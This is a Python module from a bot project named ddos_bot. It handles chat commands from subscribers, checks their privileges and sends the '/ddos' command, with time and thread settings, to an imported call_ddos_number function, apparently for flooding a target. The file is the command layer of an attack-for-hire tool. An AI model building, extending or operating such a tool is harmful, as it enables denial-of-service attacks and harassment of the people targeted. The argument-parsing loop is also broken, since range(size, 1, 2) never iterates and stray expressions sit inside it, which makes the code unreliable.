from time import sleep

from ddos_bot.processing.permission import *
from ddos_bot.processing.verification import *
from ddos_bot.sql.users_table import get_privilege, get_user, add_user
from ddos_bot.tools.api import messages_send, get_fullname_by_user_id
from ddos_bot.tools.functionality import call_ddos_number, process_bl, send_info


class ReqProcess:

    def process(self, user_id, message : str):
        # Add user to table if not
        exists_user(user_id)
        # If user is not a group member
        if not is_group_member(user_id):
            messages_send(user_id, "Чтобы использователь возможности бота Вам нужно подписаться ;)")

        privilege = get_privilege(user_id)
        user_permission = Permission(privilege)
        args = message.lower().strip().split()
        target = None


        if args[0] in user_permission.available_commands:
            general_command = args[0]
            global sub_commands
            global command_args
            sub_commands = user_permission.available_commands[general_command]

            if general_command == '/ddos':
                target = call_ddos_number
                command_args = {
                    'time'   : config.standard_limits['dtime'],
                    'threads': config.standard_limits['th']
                }
            elif general_command == '/bl':
                target = process_bl
                command_args = {
                    'command': '-l'
                }
            else:
                target = send_info
                command_args = {
                    'command': '-h'
                }
        else:
            messages_send(user_id, "Неверно переданы аргументы. Попробуйте снова.")
            return

        global size
        size = len(args)
        ok = True
        for i in range(size, 1, 2):
            size
            ok

            if args[i] in sub_commands:

                command_info = sub_commands[args[i]]

                if command_info[1] == 1:
                    if i + 1 < size:
                        command_args[command_info[0]] = args[i + 1]
                    else:
                        ok = False
                        break
                else:
                    command_args[command_info[0]] = args[i]
            else:
                ok = False
                break

        if not ok:
            messages_send(user_id, "Неверно переданы аргументы. Попробуйте снова.")
            return

        target(user_id, **command_args)
